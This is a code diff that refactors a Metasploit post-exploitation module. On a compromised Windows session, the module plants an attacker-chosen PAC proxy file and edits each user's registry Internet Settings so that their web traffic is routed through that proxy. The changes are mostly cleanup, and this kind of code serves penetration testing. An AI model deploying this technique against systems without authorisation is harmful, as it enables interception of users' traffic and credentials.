@@ -32,6 +32,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_config_getenv
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [SERVICE_RESOURCE_LOSS],
+          'SideEffects' => [CONFIG_CHANGES],
+          'Reliability' => []
         }
       )
     )
@@ -48,8 +53,7 @@ class MetasploitModule < Msf::Post
 
   def run
     if datastore['LOCAL_PAC'].blank? && datastore['REMOTE_PAC'].blank?
-      print_error('You must set a remote or local PAC file. Aborting...')
-      return
+      fail_with(Failure::BadConfig, 'You must set a remote or local PAC file. Aborting...')
     end
 
     if datastore['REMOTE_PAC']
@@ -89,30 +93,27 @@ class MetasploitModule < Msf::Post
   end
 
   def create_pac(local_pac)
-    pac_file = session.sys.config.getenv('APPDATA') << '\\' << Rex::Text.rand_text_alpha((rand(6..13))) << '.pac'
-    conf_pac = ''
+    pac_file = session.sys.config.getenv('APPDATA') << '\\' << "#{Rex::Text.rand_text_alpha(6..13)}.pac"
 
-    if ::File.exist?(local_pac)
-      conf_pac << ::File.open(local_pac, 'rb').read
-    else
+    unless ::File.exist?(local_pac)
       print_error('Local PAC file not found.')
       return false
     end
 
-    if write_file(pac_file, conf_pac)
-      print_status("PAC proxy configuration file written to #{pac_file}")
-      return pac_file
-    else
-      return false
-    end
+    conf_pac = ::File.open(local_pac, 'rb').read
+
+    return false unless write_file(pac_file, conf_pac)
+
+    print_status("PAC proxy configuration file written to #{pac_file}")
+    return pac_file
   end
 
   def enable_proxypac(pac)
     proxy_pac_enabled = false
 
     registry_enumkeys('HKU').each do |k|
-      next unless k.include? 'S-1-5-21'
-      next if k.include? '_Classes'
+      next unless k.include?('S-1-5-21')
+      next if k.include?('_Classes')
 
       key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings"
       value_auto = 'AutoConfigURL'
@@ -133,11 +134,7 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    if proxy_pac_enabled
-      return true
-    else
-      return false
-    end
+    proxy_pac_enabled
   end
 
   def auto_detect_on
@@ -154,11 +151,7 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    if auto_detect_enabled
-      return true
-    else
-      return false
-    end
+    auto_detect_enabled
   end
 
   def disable_proxy
@@ -166,8 +159,8 @@ class MetasploitModule < Msf::Post
     profile = false
 
     registry_enumkeys('HKU').each do |k|
-      next unless k.include? 'S-1-5-21'
-      next if k.include? '_Classes'
+      next unless k.include?('S-1-5-21')
+      next if k.include?('_Classes')
 
       key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings"
       begin
@@ -181,9 +174,9 @@ class MetasploitModule < Msf::Post
     if profile
       print_good('Proxy disabled.')
       return true
-    else
-      return false
     end
+
+    return false
   end
 
   def change_connection(offset, value, key)
